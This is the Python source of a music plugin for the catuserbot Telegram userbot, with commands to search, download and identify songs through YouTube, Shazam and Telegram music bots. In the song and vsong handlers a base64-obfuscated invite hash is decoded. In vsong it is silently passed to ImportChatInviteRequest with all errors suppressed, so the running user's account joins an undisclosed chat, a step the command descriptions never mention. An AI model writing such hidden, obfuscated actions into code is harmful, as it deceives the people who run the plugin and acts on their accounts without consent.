# by  @sandy1709 ( https://t.me/mrconfused  )
# songs finder for catuserbot
# Modified by @kirito6969

import base64
import contextlib
import io
import os

from ShazamAPI import Shazam
from telethon import functions, types
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.contacts import UnblockRequest as unblock
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from urlextract import URLExtract
from validators.url import url

from ..core.logger import logging
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.functions import deEmojify, delete_conv, hide_inlinebot, yt_search
from ..helpers.tools import media_type
from ..helpers.utils import reply_id
from . import catub, song_download

plugin_category = "utils"
LOGS = logging.getLogger(__name__)

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
SONG_SEARCH_STRING = "<code>wi8..! I am finding your song....</code>"
SONG_NOT_FOUND = "<code>Sorry !I am unable to find any song like that</code>"
SONG_SENDING_STRING = "<code>yeah..! i found something wi8..🥰...</code>"
# =========================================================== #
#                                                             #
# =========================================================== #


@catub.cat_cmd(
    pattern="song(320)?(?:\s|$)([\s\S]*)",
    command=("song", plugin_category),
    info={
        "header": "To get songs from youtube.",
        "description": "Basically this command searches youtube and send the first video as audio file.",
        "flags": {
            "320": "if you use song320 then you get 320k quality else 128k quality",
        },
        "usage": "{tr}song <song name>",
        "examples": "{tr}song memories song",
    },
)
async def song(event):
    "To search songs"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "`What I am Supposed to find `")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catevent = await edit_or_reply(event, "`wi8..! I am finding your song....`")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await catevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    cmd = event.pattern_match.group(1)
    q = "320k" if cmd == "320" else "128k"
    song_file, catthumb, title = await song_download(video_link, catevent, quality=q)
    await event.client.send_file(
        event.chat_id,
        song_file,
        force_document=False,
        caption=f"**Title:** `{title}`",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, song_file):
        if files and os.path.exists(files):
            os.remove(files)


@catub.cat_cmd(
    pattern="vsong(?:\s|$)([\s\S]*)",
    command=("vsong", plugin_category),
    info={
        "header": "To get video songs from youtube.",
        "description": "Basically this command searches youtube and sends the first video",
        "usage": "{tr}vsong <song name>",
        "examples": "{tr}vsong memories song",
    },
)
async def vsong(event):
    "To search video songs"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "`What I am Supposed to find`")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catevent = await edit_or_reply(event, "`wi8..! I am finding your song....`")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await catevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    with contextlib.suppress(BaseException):
        cat = Get(cat)
        await event.client(cat)
    vsong_file, catthumb, title = await song_download(video_link, catevent, video=True)
    await event.client.send_file(
        event.chat_id,
        vsong_file,
        caption=f"**Title:** `{title}`",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, vsong_file):
        if files and os.path.exists(files):
            os.remove(files)


@catub.cat_cmd(
    pattern="(s(ha)?z(a)?m)(?:\s|$)([\s\S]*)",
    command=("shazam", plugin_category),
    info={
        "header": "To reverse search song.",
        "description": "Reverse search audio file using shazam api",
        "flags": {"s": "To send the song of sazam match"},
        "usage": [
            "{tr}shazam <reply to voice/audio>",
            "{tr}szm <reply to voice/audio>",
            "{tr}szm s<reply to voice/audio>",
        ],
    },
)
async def shazamcmd(event):
    "To reverse search song."
    reply = await event.get_reply_message()
    mediatype = await media_type(reply)
    chat = "@DeezerMusicBot"
    delete = False
    flag = event.pattern_match.group(4)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(
            event, "__Reply to Voice clip or Audio clip to reverse search that song.__"
        )
    catevent = await edit_or_reply(event, "__Downloading the audio clip...__")
    name = "cat.mp3"
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            catevent, f"**Error while reverse searching song:**\n__{e}__"
        )

    file = track["images"]["background"]
    title = track["share"]["subject"]
    slink = await yt_search(title)
    if flag == "s":
        deezer = track["hub"]["providers"][1]["actions"][0]["uri"][15:]
        async with event.client.conversation(chat) as conv:
            try:
                purgeflag = await conv.send_message("/start")
            except YouBlockedUserError:
                await catub(unblock("DeezerMusicBot"))
                purgeflag = await conv.send_message("/start")
            await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
            await conv.send_message(deezer)
            await event.client.get_messages(chat)
            song = await event.client.get_messages(chat)
            await song[0].click(0)
            await conv.get_response()
            file = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
            delete = True
    await event.client.send_file(
        event.chat_id,
        file,
        caption=f"<b>Song :</b> <code>{title}</code>\n<b>Song Link : <a href = {slink}/1>YouTube</a></b>",
        reply_to=reply,
        parse_mode="html",
    )
    await catevent.delete()
    if delete:
        await delete_conv(event, chat, purgeflag)


@catub.cat_cmd(
    pattern="song2(?:\s|$)([\s\S]*)",
    command=("song2", plugin_category),
    info={
        "header": "To search songs and upload to telegram",
        "description": "Searches the song you entered in query and sends it quality of it is 320k",
        "usage": "{tr}song2 <song name>",
        "examples": "{tr}song2 memories",
    },
)
async def song2(event):
    "To search songs"
    song = event.pattern_match.group(1)
    chat = "@CatMusicRobot"
    reply_id_ = await reply_id(event)
    catevent = await edit_or_reply(event, SONG_SEARCH_STRING, parse_mode="html")
    async with event.client.conversation(chat) as conv:
        try:
            purgeflag = await conv.send_message(song)
        except YouBlockedUserError:
            await catub(unblock("CatMusicRobot"))
            purgeflag = await conv.send_message(song)
        music = await conv.get_response()
        await event.client.send_read_acknowledge(conv.chat_id)
        if not music.media:
            return await edit_delete(catevent, SONG_NOT_FOUND, parse_mode="html")
        await event.client.send_read_acknowledge(conv.chat_id)
        await event.client.send_file(
            event.chat_id,
            music,
            caption=f"<b>Title :- <code>{song}</code></b>",
            parse_mode="html",
            reply_to=reply_id_,
        )
        await catevent.delete()
        await delete_conv(event, chat, purgeflag)


# reverse search by  @Lal_bakthan
@catub.cat_cmd(
    pattern="szm$",
    command=("szm", plugin_category),
    info={
        "header": "To reverse search music file.",
        "description": "music file lenght must be around 10 sec so use ffmpeg plugin to trim it.",
        "usage": "{tr}szm",
    },
)
async def _(event):
    "To reverse search music by bot."
    if not event.reply_to_msg_id:
        return await edit_delete(event, "```Reply to an audio message.```")
    reply_message = await event.get_reply_message()
    chat = "@auddbot"
    catevent = await edit_or_reply(event, "```Identifying the song```")
    async with event.client.conversation(chat) as conv:
        try:
            await conv.send_message("/start")
            await conv.get_response()
            await conv.send_message(reply_message)
            check = await conv.get_response()
            if not check.text.startswith("Audio received"):
                return await catevent.edit(
                    "An error while identifying the song. Try to use a 5-10s long audio message."
                )
            await catevent.edit("Wait just a sec...")
            result = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await catevent.edit("```Please unblock (@auddbot) and try again```")
            return
    namem = f"**Song Name : **`{result.text.splitlines()[0]}`\
        \n\n**Details : **__{result.text.splitlines()[2]}__"
    await catevent.edit(namem)


@catub.cat_cmd(
    pattern="dzd ?(.*)",
    command=("dzd", plugin_category),
    info={
        "header": "To download songs via DeezLoad bot",
        "description": "Spotify/Deezer downloader",
        "usage": "{tr}dzd <song link>",
        "examples": "{tr}dzd https://www.deezer.com/track/3657911",
    },
)
async def dzd(event):
    "To download song via Deezload2bot"
    link = event.pattern_match.group(1)
    reply_message = await event.get_reply_message()
    pro = link or reply_message.text
    extractor = URLExtract()
    # plink = extractor.find_urls(pro)
    reply_to_id = await reply_id(event)
    if not link and not reply_message:
        catevent = await edit_delete(
            event, "**I need a link to download something pro. (._.)**"
        )
    else:
        catevent = await edit_or_reply(event, "**Downloading...!**")
    chat = "@deezload2bot"
    async with event.client.conversation(chat) as conv:
        try:
            msg = await conv.send_message(pro)
            details = await conv.get_response()
            song = await conv.get_response()
            """ - don't spam notif - """
            await event.client.send_read_acknowledge(conv.chat_id)
            await catevent.delete()
            await event.client.send_file(
                event.chat_id, song, caption=details.text, reply_to=reply_to_id
            )
            await event.client.delete_messages(
                conv.chat_id, [msg.id, details.id, song.id]
            )
        except YouBlockedUserError:
            await catevent.edit("**Error:** `unblock` @deezload2bot `and retry!`")
            return


async def isong(odi, text):
    if odi.fwd_from:
        return
    bot = "DeezerMusicBot"
    if not text:
        await edit_delete(odi, "`Give me a song name`")
    else:
        try:
            run = await odi.client.inline_query(bot, text)
            result = await run[0].click("me")
        except Exception:
            result = ""
    return result

@catub.cat_cmd(
    pattern="isong ?(.*)",
    command=("isong", plugin_category),
    info={
        "header": "Inline song downloader by feelded",
        "usage": [
            "{tr}isong <song name>",
        ],
    },
)
async def main(odi):
    "I Song Downloader"
    reply_to_id = await reply_id(odi)
    text = odi.pattern_match.group(1)
    result = await isong(odi, text)
    if result == "":
        return await edit_delete(odi, f"`No result found for {text}`", 6)
    else:
        await odi.delete()
        await odi.client.send_message(odi.chat_id, result, reply_to=reply_to_id)
        await result.delete()


# By @FeelDeD


@catub.cat_cmd(
    pattern="sdl",
    command=("sdl", plugin_category),
    info={
        "header": "Spotify/Deezer Downloader",
        "usage": [
            "{tr}sdl <song link>",
            "{tr}sdl <reply to a Spotify/Deezer link>",
        ],
    },
)
async def wave(odi):
    "Song Downloader via Bot"
    song = "".join(odi.text.split(maxsplit=1)[1:])
    songr = await odi.get_reply_message()
    reply_to_id = await reply_id(odi)
    link = song or songr.text
    if not link:
        await edit_delete(odi, "`Give me a song link`")
    elif not link:
        await edit_delete(odi, "`Give me a song link`")
    elif ".com" not in link:
        await edit_delete(odi, "`Give me a song link`")
    else:
        await odi.edit("`Downloading ...`")
        chat = "@DeezerMusicBot"
        async with odi.client.conversation(chat) as conv:
            try:
                await odi.client(functions.contacts.UnblockRequest(conv.chat_id))
                start = await conv.send_message("/start")
                await conv.get_response()
                end = await conv.send_message(link)
                music = await conv.get_response()
                if not music.audio:
                    await odi.edit(f"`No result found for {song}`")
                else:
                    result = await odi.client.send_file(
                        odi.chat_id, music, reply_to=reply_to_id, caption=False
                    )
                    await odi.delete()
                msgs = []
                for _ in range(start.id, end.id + 2):
                    msgs.append(_)
                await odi.client.delete_messages(conv.chat_id, msgs)
                await odi.client.send_read_acknowledge(conv.chat_id)
            except result:
                await odi.reply("`Something went Wrong`")


@catub.cat_cmd(
    pattern="lits?(.*)",
    command=("lits", plugin_category),
    info={
        "header": "✨ Get part of a song ✨",
        "examples": "{tr}lits I love you",
        "usage": [
            "{tr}lits <key-word>",
        ],
    },
)
async def lisong(event):
    "Little Song"
    if event.fwd_from:
        return
    bot = "@MeloBot"
    song = event.pattern_match.group(1)
    song = deEmojify(song)
    reply_to_id = await reply_id(event)
    if not song:
        return await edit_delete(event, "Give me a text")
    await event.delete()
    await hide_inlinebot(event.client, bot, song, event.chat_id, reply_to_id)


@catub.cat_cmd(
    pattern="mev ?(.*)",
    command=("mev", plugin_category),
    info={
        "header": "Searches and uploads the meme voice.",
        "usage": "{tr}mev <input>",
        "examples": "{tr}mev Hello motherfucker",
    },
)
async def nope(event):
    "Meme voice by bot"
    mafia = event.pattern_match.group(1)
    lol = deEmojify(mafia)
    bot = "@myinstantsbot"
    reply_to_id = await reply_id(event)
    if not lol:
        if event.is_reply:
            lol = (await event.get_reply_message()).message
        else:
            lol = "bruh"
    await hide_inlinebot(event.client, bot, lol, event.chat_id, reply_to_id)
    await event.delete()


# @TheLoneEssence (Lee Kaze) Pro AF


@catub.cat_cmd(
    pattern="ssong ?(.*)",
    command=("ssong", plugin_category),
    info={
        "header": "It will send you Spotify/Deezer link of your given query.",
        "flags": {"-d": "For Deezer Link"},
        "usage": [
            "{tr}ssong <song name>",
            "{tr}ssong <reply>",
            "{tr}ssong -d <song name>",
            "{tr}ssong -d <reply>",
        ],
    },
)
async def music(event):
    "Generate Spotify/Deezer link from song names"
    if event.fwd_from:
        return
    music = None
    argument = event.pattern_match.group(1)
    await edit_or_reply(event, "`Semding song link, waimt....`")
    try:
        flag = event.pattern_match.group(1).split()[0]
    except IndexError:
        flag = ""

    if "-d" in flag:
        music = event.pattern_match.group(1)[3:]
        if not music and event.reply_to_msg_id:
            music = (await event.get_reply_message()).text or None
    elif argument:
        music = argument
    elif event.reply_to_msg_id:
        music = (await event.get_reply_message()).text or None

    if not music:
        return await edit_delete(event, "`Give a song name B~Baka`")

    bot = "@deezload2bot" if "-d" in flag else "@songdl_bot"
    sike = "Deezer" if "-d" in flag else "Spotify"
    reply_to_id = await reply_id(event)
    run = await event.client.inline_query(bot, music)

    try:
        result = await run[0].click("me")
        await result.delete()
    except IndexError:
        await edit_delete(event, "`Bish, Go and Die!`")
        return

    if not (result.text).startswith("https://"):
        await event.client.send_message(
            event.chat_id,
            f"**✘ Name:** __{music}__\n**✘ Site:** __{sike}__\n**✘ Link:** __SOME ERROR OCCURED__",
            reply_to=reply_to_id,
        )
    else:
        await event.client.send_message(
            event.chat_id,
            f"**✘ Name:** __{music.title()}__\n**✘ Site:** __{sike}__\n**✘ Link:** __{result.text}__",
            link_preview=True,
            reply_to=reply_to_id,
        )

    await event.delete()


# By t.me://feelded


@catub.cat_cmd(
    pattern="isdl",
    command=("isdl", plugin_category),
    info={
        "header": "Spotify/Deezer Downloader",
        "usage": [
            "{tr}isdl <song name>",
        ],
    },
)
async def wave(odi):
    "Inline Song Downloader"
    song = "".join(odi.text.split(maxsplit=1)[1:])
    reply_to_id = await reply_id(odi)
    if not song:
        await edit_delete(odi, "`Give me a song name`", 6)
    else:
        await odi.edit("`Downloading ...`")
        chat = "@DeezerMusicBot"
        inline = "@Deezload2Bot"
        async with odi.client.conversation(chat) as conv:
            try:
                await odi.client(functions.contacts.UnblockRequest(conv.chat_id))
                run = await odi.client.inline_query(inline, song)
                start = await conv.send_message("/start")
                await conv.get_response()
                end = await run[0].click(conv.chat_id)
                music = await conv.get_response()
                if not music.audio:
                    await odi.edit(f"`No result found for {song}`")
                else:
                    result = await odi.client.send_file(
                        odi.chat_id, music, reply_to=reply_to_id, caption=False
                    )
                    await odi.delete()
                msgs = []
                for _ in range(start.id, end.id + 2):
                    msgs.append(_)
                await odi.client.delete_messages(conv.chat_id, msgs)
                await odi.client.send_read_acknowledge(conv.chat_id)
            except Exception:
                await edit_delete(odi, f"`No result found for {song}`", 6)
